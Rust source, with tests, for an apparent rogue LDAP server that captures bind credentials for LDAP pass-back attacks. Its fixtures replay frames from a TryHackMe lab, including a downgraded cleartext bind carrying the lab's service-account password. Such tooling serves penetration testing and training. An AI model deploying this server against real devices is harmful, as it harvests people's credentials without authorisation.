use std::future::Future;
use std::io;
use std::net::SocketAddr;
use std::time::Duration;

use bytes::BytesMut;
use chrono::Local;
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::{TcpListener, TcpStream};
use tokio::sync::{mpsc, watch};
use tokio::task::JoinSet;
use tokio::time::error::Elapsed;
use tokio::time::{self};
use tokio_util::codec::Encoder;

use super::codec::{ReceivedMessage, ServerCodec};
use super::error::{DecodeError, DecodeErrorReason, LdapError};
use super::event::{DisconnectReason, LdapEvent, LdapEventKind};
use super::protocol::{Request, Response};
use super::session::{HandledOperation, Session};

const MAX_CONNECTIONS: usize = 128;
const READ_TIMEOUT: Duration = Duration::from_secs(30);
const WRITE_TIMEOUT: Duration = Duration::from_secs(10);
const SHUTDOWN_TIMEOUT: Duration = Duration::from_secs(3);

pub(crate) struct LdapServer {
    listener: TcpListener,
    events: mpsc::Sender<LdapEvent>,
    raw: bool,
}

impl LdapServer {
    #[inline]
    pub(crate) fn new(listener: TcpListener, events: mpsc::Sender<LdapEvent>, raw: bool) -> Self {
        Self {
            listener,
            events,
            raw,
        }
    }

    pub(crate) async fn run<F>(self, shutdown: F) -> io::Result<()>
    where
        F: Future<Output = io::Result<()>>,
    {
        let Self {
            listener,
            events,
            raw,
        } = self;

        let (shutdown_sender, shutdown_receiver) = watch::channel(false);

        let mut connections: JoinSet<io::Result<()>> = JoinSet::new();
        let mut next_connection_id: u64 = 1;

        tokio::pin!(shutdown);

        let result: io::Result<()> = loop {
            tokio::select! {
                // Stop accepting before handling more ready sockets or tasks.
                biased;
                result = &mut shutdown => break result,
                Some(result) = connections.join_next(), if !connections.is_empty() => {
                    match result {
                        Ok(Ok(())) => {}
                        Ok(Err(error)) => break Err(error),
                        Err(_) => break Err(io::Error::other("LDAP connection task failed")),
                    }
                }
                // At capacity, leave additional connections in the TCP backlog.
                accepted = listener.accept(), if connections.len() < MAX_CONNECTIONS => {
                    let (stream, peer) = match accepted {
                        Ok(accepted) => accepted,
                        Err(error) => break Err(error),
                    };

                    let connection: Connection = Connection {
                        id: next_connection_id,
                        peer,
                        events: events.clone(),
                        shutdown: shutdown_receiver.clone(),
                        read_timeout: READ_TIMEOUT,
                        raw,
                    };

                    next_connection_id = next_connection_id.wrapping_add(1);
                    connections.spawn(connection.run(stream));
                }
            }
        };

        // Close the listener before signalling sessions.
        drop(listener);

        let _ = shutdown_sender.send(true);

        shutdown_connections(&mut connections).await;

        result
    }
}

async fn shutdown_connections(connections: &mut JoinSet<io::Result<()>>) {
    let completed: Result<(), Elapsed> = time::timeout(SHUTDOWN_TIMEOUT, async {
        while connections.join_next().await.is_some() {}
    })
    .await;

    if completed.is_err() {
        connections.shutdown().await;
    }
}

struct Connection {
    id: u64,
    peer: SocketAddr,
    events: mpsc::Sender<LdapEvent>,
    shutdown: watch::Receiver<bool>,
    read_timeout: Duration,
    raw: bool,
}

impl Connection {
    async fn emit(&self, kind: LdapEventKind) -> io::Result<()> {
        let event: LdapEvent = LdapEvent {
            timestamp: Local::now(),
            connection_id: self.id,
            peer: self.peer,
            kind,
        };

        self.events
            .send(event)
            .await
            .map_err(|_| io::Error::new(io::ErrorKind::BrokenPipe, "LDAP event receiver closed"))
    }

    async fn run(mut self, mut stream: TcpStream) -> io::Result<()> {
        self.emit(LdapEventKind::Connected).await?;

        let reason: DisconnectReason = self.serve(&mut stream).await?;

        // Close the socket before publishing the termination event. A peer
        // that stops reading cannot delay cleanup of the TCP connection.
        let _ = stream.shutdown().await;

        drop(stream);

        self.emit(LdapEventKind::Disconnected { reason }).await
    }

    async fn serve(&mut self, stream: &mut TcpStream) -> io::Result<DisconnectReason> {
        let mut codec: ServerCodec = ServerCodec::new(self.raw);
        let mut input: BytesMut = BytesMut::new();
        let mut session: Session = Session::default();

        loop {
            let message: ReceivedMessage =
                match self.receive_request(stream, &mut codec, &mut input).await {
                    Ok(message) => message,
                    Err(reason) => return Ok(reason),
                };

            if let Some(raw) = message.raw {
                self.emit(LdapEventKind::RawMessage(raw)).await?;
            }

            let request: Request = match message.request {
                Ok(request) => request,
                Err(diagnostic) => return Ok(DisconnectReason::DecodeFailed(diagnostic)),
            };

            let message_id: i32 = request.message_id;

            let mut handled: HandledOperation = match session.handle(request) {
                Ok(handled) => handled,
                Err(_) => return Ok(DisconnectReason::UnexpectedOperation),
            };

            self.publish_operation(message_id, &mut handled).await?;

            if let Err(reason) = send_responses(stream, &mut codec, handled.responses).await {
                return Ok(reason);
            }

            if handled.close_connection {
                return Ok(DisconnectReason::Unbind);
            }
        }
    }

    async fn receive_request(
        &mut self,
        stream: &mut TcpStream,
        codec: &mut ServerCodec,
        input: &mut BytesMut,
    ) -> Result<ReceivedMessage, DisconnectReason> {
        if *self.shutdown.borrow() {
            return Err(DisconnectReason::Shutdown);
        }

        // One deadline covers a complete LDAP message, not each TCP read.
        // A peer sending one byte at a time cannot extend a partial frame forever.
        let received: Result<Result<Option<ReceivedMessage>, LdapError>, Elapsed> = tokio::select! {
            biased;
            _ = self.shutdown.changed() => return Err(DisconnectReason::Shutdown),
            received = time::timeout(self.read_timeout, receive(stream, codec, input)) => received,
        };

        match received {
            Ok(Ok(Some(request))) => Ok(request),
            Ok(Ok(None)) => Err(DisconnectReason::PeerClosed),
            Ok(Err(LdapError::Decode(diagnostic))) => {
                Err(DisconnectReason::DecodeFailed(diagnostic))
            }
            Ok(Err(LdapError::Io(_))) => Err(DisconnectReason::ReadFailed),
            Err(_) => Err(DisconnectReason::ReadTimeout),
        }
    }

    async fn publish_operation(
        &self,
        message_id: i32,
        handled: &mut HandledOperation,
    ) -> io::Result<()> {
        self.emit(LdapEventKind::Operation {
            message_id,
            operation: handled.operation,
            result: handled.result,
            diagnostic: handled.diagnostic,
        })
        .await?;

        // Publish the received Bind before replying, including semantic
        // rejections. The bounded event channel applies backpressure.
        if let Some(bind) = handled.bind.take() {
            self.emit(LdapEventKind::BindReceived(bind)).await?;
        }

        Ok(())
    }
}

async fn receive(
    stream: &mut TcpStream,
    codec: &mut ServerCodec,
    input: &mut BytesMut,
) -> Result<Option<ReceivedMessage>, LdapError> {
    let mut chunk: [u8; 4096] = [0; 4096];

    loop {
        if let Some(request) = codec.decode_message(input)? {
            return Ok(Some(request));
        }

        let bytes_read: usize = stream.read(&mut chunk).await?;

        if bytes_read == 0 {
            if input.is_empty() {
                return Ok(None);
            }

            // EOF between messages is normal; EOF inside a frame is malformed.
            let reason: DecodeErrorReason = DecodeErrorReason::IncompleteMessage {
                received: input.len(),
            };

            return Err(DecodeError::new(reason).into());
        }

        input.extend_from_slice(&chunk[..bytes_read]);
    }
}

async fn send_responses(
    stream: &mut TcpStream,
    codec: &mut ServerCodec,
    responses: Vec<Response>,
) -> Result<(), DisconnectReason> {
    let output: BytesMut = encode_responses(codec, responses)?;

    if output.is_empty() {
        return Ok(());
    }

    // A response already in progress may finish after shutdown is requested.
    // The server's grace-period deadline bounds how long this can take.
    match time::timeout(WRITE_TIMEOUT, stream.write_all(&output)).await {
        Ok(Ok(())) => Ok(()),
        Ok(Err(_)) => Err(DisconnectReason::WriteFailed),
        Err(_) => Err(DisconnectReason::WriteTimeout),
    }
}

fn encode_responses(
    codec: &mut ServerCodec,
    responses: Vec<Response>,
) -> Result<BytesMut, DisconnectReason> {
    let mut output: BytesMut = BytesMut::new();

    for response in responses {
        codec
            .encode(response, &mut output)
            .map_err(|_| DisconnectReason::ResponseEncodingFailed)?;
    }

    Ok(output)
}

#[cfg(test)]
mod tests {
    use tokio::sync::oneshot;
    use tokio::task::JoinHandle;

    use super::*;
    use crate::ldap::event::{BindEvent, LoginPhase};
    use crate::ldap::protocol::{
        BindAuthentication, BindRequest, Filter, RequestOperation, Response, ResponseOperation,
        ResultCode, ResultKind, SaslMechanism, SearchRequest, SearchScope, UnsupportedOperation,
    };
    use crate::ldap::test_wire;

    const TEST_TIMEOUT: Duration = Duration::from_secs(3);
    // Independent BER fixtures, not generated by the production codec.
    const SIMPLE_BIND: &[u8] =
        b"\x30\x17\x02\x01\x01\x60\x12\x02\x01\x03\x04\x05alice\x80\x06secret";
    const LOGIN_WITHOUT_CREDENTIALS: &[u8] =
        b"\x30\x13\x02\x01\x01\x60\x0e\x02\x01\x03\x04\x00\xa3\x07\x04\x05LOGIN";
    const PLAIN_WITHOUT_CREDENTIALS: &[u8] =
        b"\x30\x13\x02\x01\x01\x60\x0e\x02\x01\x03\x04\x00\xa3\x07\x04\x05PLAIN";

    struct TestServer {
        address: SocketAddr,
        events: mpsc::Receiver<LdapEvent>,
        shutdown_sender: oneshot::Sender<()>,
        task: JoinHandle<io::Result<()>>,
    }

    impl TestServer {
        async fn start() -> Self {
            Self::start_with_raw(false).await
        }

        async fn start_with_raw(raw: bool) -> Self {
            let listener: TcpListener = TcpListener::bind("127.0.0.1:0").await.unwrap();
            let address: SocketAddr = listener.local_addr().unwrap();
            let (sender, events) = mpsc::channel(256);
            let (shutdown_sender, shutdown_requested) = oneshot::channel();

            let task: JoinHandle<io::Result<()>> = tokio::spawn(
                LdapServer::new(listener, sender, raw)
                    .run(async { shutdown_requested.await.map_err(io::Error::other) }),
            );

            Self {
                address,
                events,
                shutdown_sender,
                task,
            }
        }

        async fn receive_bind(&mut self, message_id: i32) -> BindEvent {
            time::timeout(TEST_TIMEOUT, async {
                while let Some(event) = self.events.recv().await {
                    if let LdapEventKind::BindReceived(bind) = event.kind {
                        if bind.message_id == message_id {
                            return bind;
                        }
                    }
                }

                panic!("event stream closed without the requested Bind");
            })
            .await
            .unwrap()
        }

        async fn shutdown(mut self) -> Vec<LdapEvent> {
            self.shutdown_sender.send(()).unwrap();

            time::timeout(TEST_TIMEOUT, self.task)
                .await
                .unwrap()
                .unwrap()
                .unwrap();

            let mut events: Vec<LdapEvent> = Vec::new();

            while let Some(event) = self.events.recv().await {
                events.push(event);
            }

            events
        }
    }

    struct Client {
        stream: TcpStream,
        input: BytesMut,
    }

    impl Client {
        async fn connect(address: SocketAddr) -> Self {
            Self {
                stream: TcpStream::connect(address).await.unwrap(),
                input: BytesMut::new(),
            }
        }

        async fn send(&mut self, message_id: i32, operation: RequestOperation) {
            let encoded: Vec<u8> = test_wire::encode_request(message_id, operation);

            self.stream.write_all(&encoded).await.unwrap();
        }

        async fn receive_response(&mut self) -> Response {
            time::timeout(TEST_TIMEOUT, async {
                loop {
                    if let Some(message) = test_wire::decode_response(&mut self.input) {
                        return message;
                    }

                    assert_ne!(self.stream.read_buf(&mut self.input).await.unwrap(), 0);
                }
            })
            .await
            .unwrap()
        }

        async fn assert_bind_response(&mut self, id: i32, code: ResultCode) -> Option<Vec<u8>> {
            let message: Response = self.receive_response().await;

            assert_eq!(message.message_id, id);

            let ResponseOperation::Bind {
                code: actual,
                challenge,
                ..
            } = message.operation
            else {
                panic!("expected BindResponse");
            };

            assert_eq!(actual, code);

            challenge
        }

        async fn assert_bind_diagnostic(
            &mut self,
            id: i32,
            code: ResultCode,
        ) -> Option<&'static str> {
            let message: Response = self.receive_response().await;

            assert_eq!(message.message_id, id);

            let ResponseOperation::Bind {
                code: actual,
                challenge,
                diagnostic,
            } = message.operation
            else {
                panic!("expected BindResponse");
            };

            assert_eq!(actual, code);
            assert_eq!(challenge, None);

            diagnostic
        }

        async fn assert_connection_closed(&mut self) {
            let mut byte: [u8; 1] = [0];

            match time::timeout(TEST_TIMEOUT, self.stream.read(&mut byte))
                .await
                .unwrap()
            {
                Ok(size) => assert_eq!(size, 0),
                // Closing a socket with unread peer data may produce TCP RST.
                Err(error) => assert_eq!(error.kind(), io::ErrorKind::ConnectionReset),
            }
        }
    }

    fn root_search_request(selectors: &[&str]) -> RequestOperation {
        let attributes: Vec<String> = selectors.iter().map(|name| name.to_string()).collect();

        RequestOperation::Search(SearchRequest {
            base: String::new(),
            scope: SearchScope::Base,
            size_limit: 0,
            time_limit: 0,
            types_only: false,
            filter: Filter::Present("objectClass".to_owned()),
            attributes,
        })
    }

    fn simple_bind_request(dn: &str, password: &str) -> RequestOperation {
        RequestOperation::Bind(BindRequest {
            version: 3,
            dn: dn.to_string(),
            authentication: BindAuthentication::Simple(password.as_bytes().to_vec()),
        })
    }

    fn sasl_bind_request(mechanism: SaslMechanism, credentials: &[u8]) -> RequestOperation {
        RequestOperation::Bind(BindRequest {
            version: 3,
            dn: String::new(),
            authentication: BindAuthentication::Sasl {
                mechanism,
                credentials: credentials.to_vec(),
            },
        })
    }

    fn assert_simple_payload(bind: &BindEvent, expected: &[u8]) {
        let BindAuthentication::Simple(payload) = &bind.request.authentication else {
            panic!("expected Simple Bind");
        };

        assert_eq!(payload, expected);
    }

    // Real BER frames captured from a Windows-style LDAP client performing an
    // LDAP pass-back (TryHackMe "Breaching Active Directory", task 4): RootDSE
    // negotiation, a Sicily NTLM Bind, and the downgraded LDAPv2 simple Bind
    // carrying cleartext credentials on a second connection.
    const PRINTER_CAPABILITIES_SEARCH: &[u8] = b"\
        \x30\x84\x00\x00\x00\x44\x02\x01\x32\x63\x84\x00\x00\x00\x3b\x04\x00\x0a\x01\x00\x0a\x01\x00\
        \x02\x01\x00\x02\x01\x78\x01\x01\x00\x87\x0bobjectclass\x30\x84\x00\x00\x00\x17\x04\x15\
        supportedCapabilities";
    const PRINTER_MECHANISMS_SEARCH: &[u8] = b"\
        \x30\x84\x00\x00\x00\x46\x02\x01\x33\x63\x84\x00\x00\x00\x3d\x04\x00\x0a\x01\x00\x0a\x01\x00\
        \x02\x01\x00\x02\x01\x78\x01\x01\x00\x87\x0bobjectclass\x30\x84\x00\x00\x00\x19\x04\x17\
        supportedSASLMechanisms";
    const PRINTER_CAPABILITIES_SEARCH_AGAIN: &[u8] = b"\
        \x30\x84\x00\x00\x00\x44\x02\x01\x34\x63\x84\x00\x00\x00\x3b\x04\x00\x0a\x01\x00\x0a\x01\x00\
        \x02\x01\x00\x02\x01\x78\x01\x01\x00\x87\x0bobjectclass\x30\x84\x00\x00\x00\x17\x04\x15\
        supportedCapabilities";
    const PRINTER_SICILY_BIND: &[u8] = b"\
        \x30\x84\x00\x00\x00\x3c\x02\x01\x35\x60\x84\x00\x00\x00\x33\x02\x01\x03\x04\x04NTLM\x8a\x28\
        NTLMSSP\x00\x01\x00\x00\x00\x07\x82\x08\xa2\
        \x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\
        \x0a\x00\x63\x45\x00\x00\x00\x0f";
    const PRINTER_DOWNGRADED_BIND: &[u8] = b"\
        \x30\x84\x00\x00\x00\x3b\x02\x01\x05\x60\x84\x00\x00\x00\x32\x02\x01\x02\x04\x18\
        za.tryhackme.com\\svcLDAP\x80\x13tryhackmeldappass1@";

    #[tokio::test]
    async fn replays_thm_bind_sequence_and_captures_credentials() {
        let mut harness: TestServer = TestServer::start().await;
        let mut negotiation: Client = Client::connect(harness.address).await;

        // The negotiation phase: the client asks for the server's capabilities
        // and SASL mechanisms before choosing its own Bind method.
        negotiation
            .stream
            .write_all(PRINTER_CAPABILITIES_SEARCH)
            .await
            .unwrap();
        negotiation
            .stream
            .write_all(PRINTER_MECHANISMS_SEARCH)
            .await
            .unwrap();
        negotiation
            .stream
            .write_all(PRINTER_CAPABILITIES_SEARCH_AGAIN)
            .await
            .unwrap();

        for message_id in [50, 51, 52] {
            let entry: Response = negotiation.receive_response().await;
            assert_eq!(entry.message_id, message_id);
            let ResponseOperation::SearchEntry(attributes) = entry.operation else {
                panic!("expected RootDSE entry");
            };

            if message_id == 51 {
                assert_eq!(attributes.len(), 1);
                assert_eq!(attributes[0].name, "supportedSASLMechanisms");
                assert_eq!(
                    attributes[0].values,
                    vec![b"PLAIN".to_vec(), b"LOGIN".to_vec()]
                );
            } else {
                assert!(attributes.is_empty());
            }

            let done: Response = negotiation.receive_response().await;
            assert_eq!(done.message_id, message_id);
            assert!(matches!(
                done.operation,
                ResponseOperation::Result {
                    kind: ResultKind::SearchDone,
                    code: ResultCode::Success,
                }
            ));
        }

        // Replay the client's Sicily NTLM Bind; TCP segmentation is tested by the codec.
        negotiation
            .stream
            .write_all(PRINTER_SICILY_BIND)
            .await
            .unwrap();

        let diagnostic: Option<&'static str> = negotiation
            .assert_bind_diagnostic(53, ResultCode::InvalidDNSyntax)
            .await;

        assert_eq!(diagnostic, Some("invalid DN"));

        let sicily: BindEvent = harness.receive_bind(53).await;
        let BindAuthentication::Sicily(authentication) = sicily.request.authentication else {
            panic!("expected Sicily Bind");
        };

        assert_eq!(sicily.request.dn, "NTLM");
        assert_eq!(
            authentication.payload(),
            &PRINTER_SICILY_BIND[26..],
            "the NTLM token must be preserved verbatim"
        );

        // The rejection does not end the session: the client may continue on
        // the same connection, as it does after a search.
        negotiation
            .send(54, root_search_request(&["supportedSASLMechanisms"]))
            .await;

        let entry: Response = negotiation.receive_response().await;
        assert_eq!(entry.message_id, 54);
        let ResponseOperation::SearchEntry(attributes) = entry.operation else {
            panic!("expected RootDSE entry");
        };
        assert_eq!(attributes.len(), 1);
        assert_eq!(attributes[0].name, "supportedSASLMechanisms");
        assert_eq!(
            attributes[0].values,
            vec![b"PLAIN".to_vec(), b"LOGIN".to_vec()]
        );

        let done: Response = negotiation.receive_response().await;
        assert_eq!(done.message_id, 54);
        assert!(matches!(
            done.operation,
            ResponseOperation::Result {
                kind: ResultKind::SearchDone,
                code: ResultCode::Success,
            }
        ));

        // Replay the client's subsequent LDAPv2 simple Bind on a new connection.
        // The DOMAIN\user name is not a DN, but its credentials are captured.
        let mut downgraded: Client = Client::connect(harness.address).await;

        downgraded
            .stream
            .write_all(PRINTER_DOWNGRADED_BIND)
            .await
            .unwrap();

        let diagnostic: Option<&'static str> = downgraded
            .assert_bind_diagnostic(5, ResultCode::InvalidDNSyntax)
            .await;

        assert_eq!(diagnostic, Some("invalid DN"));

        let bind: BindEvent = harness.receive_bind(5).await;

        assert_eq!(bind.request.version, 2);
        assert_eq!(bind.request.dn, "za.tryhackme.com\\svcLDAP");
        assert_simple_payload(&bind, b"tryhackmeldappass1@");

        downgraded.send(6, RequestOperation::Unbind).await;
        downgraded.assert_connection_closed().await;

        let remaining: Vec<LdapEvent> = harness.shutdown().await;

        assert!(remaining.iter().any(|event| matches!(
            event.kind,
            LdapEventKind::Disconnected {
                reason: DisconnectReason::Unbind
            }
        )));
        assert!(!remaining.iter().any(|event| matches!(
            event.kind,
            LdapEventKind::Disconnected {
                reason: DisconnectReason::DecodeFailed(_)
            }
        )));
    }

    #[tokio::test]
    async fn raw_mode_records_separate_complete_frames_and_bind_fields() {
        let harness: TestServer = TestServer::start_with_raw(true).await;
        let mut client: Client = Client::connect(harness.address).await;
        let search: Vec<u8> =
            test_wire::encode_request(1, root_search_request(&["supportedLDAPVersion"]));
        let simple: Vec<u8> = test_wire::encode_request(
            2,
            simple_bind_request("cn=svcLDAP,dc=example,dc=com", "secret"),
        );
        let unbind: Vec<u8> = test_wire::encode_request(3, RequestOperation::Unbind);
        let mut batch: Vec<u8> = search.clone();
        batch.extend_from_slice(&simple);
        batch.extend_from_slice(&unbind);

        client.stream.write_all(&batch).await.unwrap();

        assert_eq!(client.receive_response().await.message_id, 1);
        assert_eq!(client.receive_response().await.message_id, 1);
        client.assert_bind_response(2, ResultCode::Success).await;
        client.assert_connection_closed().await;

        let mut malformed: Client = Client::connect(harness.address).await;
        let malformed_peer: SocketAddr = malformed.stream.local_addr().unwrap();
        malformed.stream.write_all(b"\x30\x00").await.unwrap();
        malformed.assert_connection_closed().await;

        let events: Vec<LdapEvent> = harness.shutdown().await;
        let frames: Vec<&[u8]> = events
            .iter()
            .filter_map(|event| match &event.kind {
                LdapEventKind::RawMessage(message) => Some(message.bytes.as_ref()),
                _ => None,
            })
            .collect();

        assert_eq!(
            frames,
            vec![
                search.as_slice(),
                simple.as_slice(),
                unbind.as_slice(),
                b"\x30\x00"
            ]
        );
        assert!(events.iter().any(
            |event| matches!(&event.kind, LdapEventKind::BindReceived(bind) if bind.message_id == 2)
        ));
        let raw_position: usize = events
            .iter()
            .position(|event| {
                event.peer == malformed_peer && matches!(event.kind, LdapEventKind::RawMessage(_))
            })
            .unwrap();
        let disconnect_position: usize = events
            .iter()
            .position(|event| {
                event.peer == malformed_peer
                    && matches!(
                        event.kind,
                        LdapEventKind::Disconnected {
                            reason: DisconnectReason::DecodeFailed(_)
                        }
                    )
            })
            .unwrap();

        assert!(raw_position < disconnect_position);
        assert!(!events.iter().any(|event| {
            event.peer == malformed_peer && matches!(event.kind, LdapEventKind::BindReceived(_))
        }));
    }

    fn assert_sasl_payload(bind: &BindEvent, expected_mechanism: SaslMechanism, expected: &[u8]) {
        let BindAuthentication::Sasl {
            mechanism,
            credentials,
        } = &bind.request.authentication
        else {
            panic!("expected SASL Bind");
        };

        assert_eq!(*mechanism, expected_mechanism);
        assert_eq!(credentials, expected);
    }

    #[tokio::test]
    async fn simple_binds_preserve_binary_and_unicode_credentials() {
        let mut harness: TestServer = TestServer::start().await;
        let mut client: Client = Client::connect(harness.address).await;

        let mut packet: Vec<u8> = SIMPLE_BIND.to_vec();
        *packet.last_mut().unwrap() = 0xff;

        let unicode_bind: Vec<u8> =
            test_wire::encode_request(2, simple_bind_request("EXAMPLE\\svcLDAP", "sëcret\n\0"));
        packet.extend_from_slice(&unicode_bind);
        client.stream.write_all(&packet).await.unwrap();

        // Both Bind names are invalid DNs, but their binary and Unicode
        // credentials must still be captured verbatim.
        client
            .assert_bind_response(1, ResultCode::InvalidDNSyntax)
            .await;
        client
            .assert_bind_response(2, ResultCode::InvalidDNSyntax)
            .await;

        let first: BindEvent = harness.receive_bind(1).await;

        assert_eq!(first.request.dn, "alice");
        assert_simple_payload(&first, b"secre\xff");

        let second: BindEvent = harness.receive_bind(2).await;

        assert_eq!(second.request.version, 3);
        assert_eq!(second.request.dn, "EXAMPLE\\svcLDAP");
        assert_simple_payload(&second, "sëcret\n\0".as_bytes());
        assert_eq!(
            format!("{:?}", second.request.authentication),
            "Simple(<redacted>)"
        );

        harness.shutdown().await;
    }

    #[tokio::test]
    async fn plain_initial_and_deferred_responses_preserve_bind_payloads() {
        let mut harness: TestServer = TestServer::start().await;
        let mut client: Client = Client::connect(harness.address).await;

        client
            .send(
                5,
                sasl_bind_request(SaslMechanism::Plain, b"delegate\0alice\0secret"),
            )
            .await;

        client.assert_bind_response(5, ResultCode::Success).await;

        let bind: BindEvent = harness.receive_bind(5).await;

        assert_sasl_payload(&bind, SaslMechanism::Plain, b"delegate\0alice\0secret");

        client
            .stream
            .write_all(PLAIN_WITHOUT_CREDENTIALS)
            .await
            .unwrap();

        assert_eq!(
            client
                .assert_bind_response(1, ResultCode::SaslBindInProgress)
                .await,
            Some(vec![])
        );

        client
            .send(
                2,
                sasl_bind_request(SaslMechanism::Plain, b"\0bob\0password"),
            )
            .await;

        client.assert_bind_response(2, ResultCode::Success).await;

        let bind: BindEvent = harness.receive_bind(2).await;

        assert_sasl_payload(&bind, SaslMechanism::Plain, b"\0bob\0password");

        harness.shutdown().await;
    }

    #[tokio::test]
    async fn login_without_initial_credentials_and_with_initial_username() {
        let mut harness: TestServer = TestServer::start().await;
        let mut client: Client = Client::connect(harness.address).await;

        client
            .stream
            .write_all(LOGIN_WITHOUT_CREDENTIALS)
            .await
            .unwrap();

        assert_eq!(
            client
                .assert_bind_response(1, ResultCode::SaslBindInProgress)
                .await,
            Some(b"Username:".to_vec())
        );

        client
            .send(2, sasl_bind_request(SaslMechanism::Login, b"alice"))
            .await;

        assert_eq!(
            client
                .assert_bind_response(2, ResultCode::SaslBindInProgress)
                .await,
            Some(b"Password:".to_vec())
        );

        client
            .send(3, sasl_bind_request(SaslMechanism::Login, b"secret"))
            .await;

        client.assert_bind_response(3, ResultCode::Success).await;

        let initial: BindEvent = harness.receive_bind(1).await;
        let username: BindEvent = harness.receive_bind(2).await;
        let password: BindEvent = harness.receive_bind(3).await;

        assert_eq!(initial.login_phase, None);
        assert_eq!(username.login_phase, Some(LoginPhase::Username));
        assert_sasl_payload(&username, SaslMechanism::Login, b"alice");
        assert_eq!(password.login_phase, Some(LoginPhase::Password));
        assert_sasl_payload(&password, SaslMechanism::Login, b"secret");

        client
            .send(4, sasl_bind_request(SaslMechanism::Login, b"bob"))
            .await;

        assert_eq!(
            client
                .assert_bind_response(4, ResultCode::SaslBindInProgress)
                .await,
            Some(b"Password:".to_vec())
        );

        client
            .send(
                5,
                sasl_bind_request(SaslMechanism::Login, b"another-secret"),
            )
            .await;

        client.assert_bind_response(5, ResultCode::Success).await;

        let username: BindEvent = harness.receive_bind(4).await;
        let password: BindEvent = harness.receive_bind(5).await;

        assert_eq!(username.login_phase, Some(LoginPhase::Username));
        assert_sasl_payload(&username, SaslMechanism::Login, b"bob");
        assert_eq!(password.login_phase, Some(LoginPhase::Password));
        assert_sasl_payload(&password, SaslMechanism::Login, b"another-secret");

        harness.shutdown().await;
    }

    #[tokio::test]
    async fn sasl_state_is_isolated_between_connections_and_reset_by_a_simple_bind() {
        let mut harness: TestServer = TestServer::start().await;
        let mut first: Client = Client::connect(harness.address).await;
        let mut second: Client = Client::connect(harness.address).await;

        first
            .send(1, sasl_bind_request(SaslMechanism::Login, b"alice"))
            .await;

        assert_eq!(
            first
                .assert_bind_response(1, ResultCode::SaslBindInProgress)
                .await,
            Some(b"Password:".to_vec())
        );

        second
            .send(2, sasl_bind_request(SaslMechanism::Login, b"bob"))
            .await;

        assert_eq!(
            second
                .assert_bind_response(2, ResultCode::SaslBindInProgress)
                .await,
            Some(b"Password:".to_vec())
        );

        first.send(3, root_search_request(&["+"])).await;

        assert!(
            matches!(first.receive_response().await.operation, ResponseOperation::Result { kind: ResultKind::SearchDone, code } if code == ResultCode::OperationsError)
        );

        first
            .send(
                4,
                simple_bind_request("cn=dave,dc=example,dc=com", "simple-secret"),
            )
            .await;

        first.assert_bind_response(4, ResultCode::Success).await;

        assert_eq!(
            harness.receive_bind(4).await.request.dn,
            "cn=dave,dc=example,dc=com"
        );

        second
            .send(5, sasl_bind_request(SaslMechanism::Login, b"bob-secret"))
            .await;

        second.assert_bind_response(5, ResultCode::Success).await;

        let password: BindEvent = harness.receive_bind(5).await;

        assert_eq!(password.login_phase, Some(LoginPhase::Password));
        assert_sasl_payload(&password, SaslMechanism::Login, b"bob-secret");

        first
            .send(6, sasl_bind_request(SaslMechanism::Login, b""))
            .await;

        assert_eq!(
            first
                .assert_bind_response(6, ResultCode::SaslBindInProgress)
                .await,
            Some(b"Username:".to_vec())
        );

        harness.shutdown().await;
    }

    #[tokio::test]
    async fn anonymous_bind_abandon_unsupported_extensions_and_controls() {
        let harness: TestServer = TestServer::start().await;
        let mut client: Client = Client::connect(harness.address).await;

        client.send(1, simple_bind_request("", "")).await;

        client.assert_bind_response(1, ResultCode::Success).await;

        client.send(2, RequestOperation::Abandon).await;
        client
            .send(
                3,
                RequestOperation::Unsupported(UnsupportedOperation::Extended),
            )
            .await;

        let response: Response = client.receive_response().await;

        assert_eq!(response.message_id, 3);
        assert!(
            matches!(response.operation, ResponseOperation::Result { kind: ResultKind::Rejected(UnsupportedOperation::Extended), code } if code == ResultCode::UnwillingToPerform)
        );

        let mut packet: Vec<u8> = SIMPLE_BIND.to_vec();
        packet[1] += 14;
        packet.extend_from_slice(b"\xa0\x0c\x30\x0a\x04\x051.2.3\x01\x01\xff");

        client.stream.write_all(&packet).await.unwrap();

        client
            .assert_bind_response(1, ResultCode::UnavailableCriticalExtension)
            .await;

        *packet.last_mut().unwrap() = 0;

        client.stream.write_all(&packet).await.unwrap();

        // The fixture DN "alice" is not a plausible DN: the non-critical
        // control is ignored and slapd's invalidDN reply is sent instead.
        client
            .assert_bind_response(1, ResultCode::InvalidDNSyntax)
            .await;

        let events: Vec<LdapEvent> = harness.shutdown().await;

        assert_eq!(
            events
                .iter()
                .filter(|event| matches!(event.kind, LdapEventKind::BindReceived(_)))
                .count(),
            3
        );
    }

    #[tokio::test]
    async fn shutdown_closes_idle_and_partial_sessions_and_keeps_bind_events() {
        let mut harness: TestServer = TestServer::start().await;
        let mut first: Client = Client::connect(harness.address).await;
        let mut second: Client = Client::connect(harness.address).await;

        first
            .send(
                1,
                simple_bind_request("cn=alice,dc=example,dc=com", "secret"),
            )
            .await;

        first.assert_bind_response(1, ResultCode::Success).await;

        second.stream.write_all(&SIMPLE_BIND[..10]).await.unwrap();

        let peers: [SocketAddr; 2] = [
            first.stream.local_addr().unwrap(),
            second.stream.local_addr().unwrap(),
        ];
        let mut events: Vec<LdapEvent> = Vec::new();

        // Both sockets must be accepted before shutdown, including the partial reader.
        time::timeout(TEST_TIMEOUT, async {
            let mut connected: usize = 0;
            while connected < peers.len() {
                let event: LdapEvent = harness
                    .events
                    .recv()
                    .await
                    .expect("expected connection event");
                if matches!(event.kind, LdapEventKind::Connected) {
                    connected += 1;
                }
                events.push(event);
            }
        })
        .await
        .unwrap();
        events.extend(harness.shutdown().await);

        first.assert_connection_closed().await;
        second.assert_connection_closed().await;

        assert!(events.iter().any(|event| {
            matches!(&event.kind, LdapEventKind::BindReceived(bind) if bind.message_id == 1)
        }));
        for peer in peers {
            assert!(
                events.iter().any(|event| {
                    event.peer == peer
                        && matches!(
                            event.kind,
                            LdapEventKind::Disconnected {
                                reason: DisconnectReason::Shutdown
                            }
                        )
                }),
                "missing shutdown event for {peer}"
            );
        }
    }

    #[tokio::test]
    async fn idle_and_partial_frames_time_out() {
        for partial in [false, true] {
            let listener: TcpListener = TcpListener::bind("127.0.0.1:0").await.unwrap();
            let address: SocketAddr = listener.local_addr().unwrap();
            let mut client: Client = Client::connect(address).await;
            let (stream, peer) = listener.accept().await.unwrap();

            let (sender, mut events) = mpsc::channel(16);
            // Keep the sender alive: dropping it would interrupt the read as shutdown.
